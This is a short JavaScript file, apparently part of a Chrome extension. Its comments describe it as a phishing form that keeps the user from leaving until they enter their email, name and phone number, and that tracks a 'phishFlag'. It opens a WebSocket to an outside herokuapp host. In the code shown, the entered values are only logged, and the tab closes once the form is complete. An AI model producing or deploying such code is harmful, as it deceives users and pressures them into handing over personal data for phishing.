var HOST = 'wss://projectnickname123.herokuapp.com';
var ws = new WebSocket(HOST);

/*
This is the background of the form, which will not let the user leave until they
fill out all the fields. Once they fill out all the fields, it will flip the
phishflag back to nope, signifying we ar enot trying to fish right now.
*/
document.getElementById("subBtn").addEventListener("click", checkFunc);

function checkFunc(){
  var flag = "";
  chrome.storage.sync.get("phishFlag", function(ev){
    flag = ev.phishFlag;
    console.log("phishFlag in background load is " + flag);
  });
  var emailString = document.getElementById("email").value;
  var nameString = document.getElementById("name").value;
  var numberString = document.getElementById("number").value;
  console.log(emailString + " " + nameString + " " + numberString);
  
  if(emailString == '' || nameString == '' || numberString == ''){
    alert("You did not fill out everything!");
  }
  else{
    var val = "";
    chrome.storage.sync.set({'webSite': val}, function(){});
    alert("Thank you for filling the form! Refresh the page and the information will display correctly.");
    chrome.tabs.getCurrent(function(tab){
      chrome.tabs.remove(tab.id, function(){});
    });
  }
}
